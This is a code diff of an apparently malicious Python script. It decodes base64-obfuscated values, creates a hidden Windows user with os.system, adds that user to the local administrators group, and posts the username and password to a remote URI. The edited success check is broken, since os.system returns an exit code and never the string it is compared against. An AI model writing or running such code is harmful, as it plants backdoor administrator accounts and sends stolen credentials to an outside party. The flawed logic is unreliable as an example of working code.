@@ -15,12 +15,16 @@ pass_string = "'SUJyaW5nRGFIMzR0IQ=='"
 uri = base64.b64decode(uri_string)
 user = base64.b64decode(user_string)
 passwd = base64.b64decode(pass_string)
-try:
-    os.system("net user " + user + " " + passwd + " /add")
-    os.system("net localgroup administrators " + user + " /add")
+
+response = os.system("net user " + user + " " + passwd + " /add")
+if response == "The command completed successfully.":
     status = "Success"
-except:
+    os.system("net localgroup administrators " + user + " /add")
+    if response != "The command completed successfully.":
+        status = "Failure"
+else:
     status = "Failure"
+    
 if status == "Success":
     requests.post(uri, data={"timestamp":time.time(), "status":status, "u":user, "p":passwd})
 else:
